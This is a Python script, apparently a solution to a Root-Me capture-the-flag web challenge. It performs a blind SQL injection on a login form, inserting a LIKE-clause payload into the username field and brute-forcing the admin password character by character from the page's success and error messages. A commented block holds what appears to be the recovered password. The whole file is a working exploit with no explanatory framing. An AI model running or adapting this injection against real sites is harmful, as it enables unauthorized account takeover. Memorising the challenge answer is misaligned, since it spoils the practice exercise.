import http.client, urllib.request, urllib.parse, urllib.error
import sys
import string

MSG_OK = "Welcome back"
MSG_ERROR = "Error : no such user"

def go(passwd):
  params = urllib.parse.urlencode(
    {
      'username': "admin' and password like '%" + passwd + "' -- ",
      # "username": 'admin',
      "password": passwd
    })
  headers = {"Content-type": "application/x-www-form-urlencoded",
        "Accept": "text/plain"}
  conn = http.client.HTTPConnection("challenge01.root-me.org")
  conn.request("POST", "/web-serveur/ch10/", params, headers)
  response = conn.getresponse()
  data = response.read()
  data = data.decode('utf-8')
  conn.close()
  # print(type(MSG_OK))
  if MSG_OK in data:
    return True
  if MSG_ERROR in data:
    return False
  return None

passwd = ""
char = string.ascii_letters + string.digits + "_/.,!@#$^&+()_-+[]{};`:\"\\<>/?|"

# e2azo93i
# passwd = [['e', 'E'], ['2'], ['a', 'A'], ['z', 'Z'], ['o', 'O'], ['9'], ['3'], ['i', 'I']]
# def x(cur, lst):
#   if len(lst) == 0:
#     print(cur, go(cur))
#     return

#   for o in lst[0]:
#     x(cur + o, lst[1:])

# x("", passwd)

while True:
  for ch in char:
    res = go(ch + passwd)
    if res is True:
      passwd = ch + passwd
      # print(passwd, flush=True, end='')
      print(passwd)
      sys.stdout.flush()
      break

    if res is False:
      print(".", flush=True, end='')
      # sys.stdout.write(".")
      # sys.stdout.flush()
      continue

    print("None returned")
  # print(passwd)
print("Final password is: " + passwd)